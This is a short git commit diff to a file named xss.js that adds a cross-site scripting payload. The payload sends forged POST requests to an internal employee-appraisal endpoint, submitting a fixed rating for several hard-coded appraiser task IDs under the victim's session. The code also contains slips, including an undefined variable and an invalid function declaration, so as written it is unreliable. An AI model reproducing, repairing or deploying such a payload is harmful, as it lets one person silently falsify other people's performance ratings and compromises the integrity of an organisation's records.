701f3d9af948f3f2618a77b899eb75fe9127ab8e
tejavardhan <teja@infinote.net>
2014-08-21 15:23:06 +0530

    Update xss.js

--- xss.js
+++ xss.js
@@ -1,3 +1,20 @@
-$(document).ready(function(){
-  alert('Hi');
-})
+function () {
+    var taskIds = [760,1437,758];
+    for (var i = 0; i < taskIds.length; i++) {
+        var postData = {
+            "rating": 7,
+            "taskAppraiserId": taskId[i]
+        }
+        $.ajax({
+            type: 'POST',
+            url: "http://192.168.1.211:8080/beesheets/employee/appraisals/othersRating/save",
+            dataType: 'json',
+            contentType: 'application/json',
+            data: JSON.stringify(postData),
+            success: function (data) {
+            }
+        });
+    }
+}
+alert('hi');
+//xssRatings();
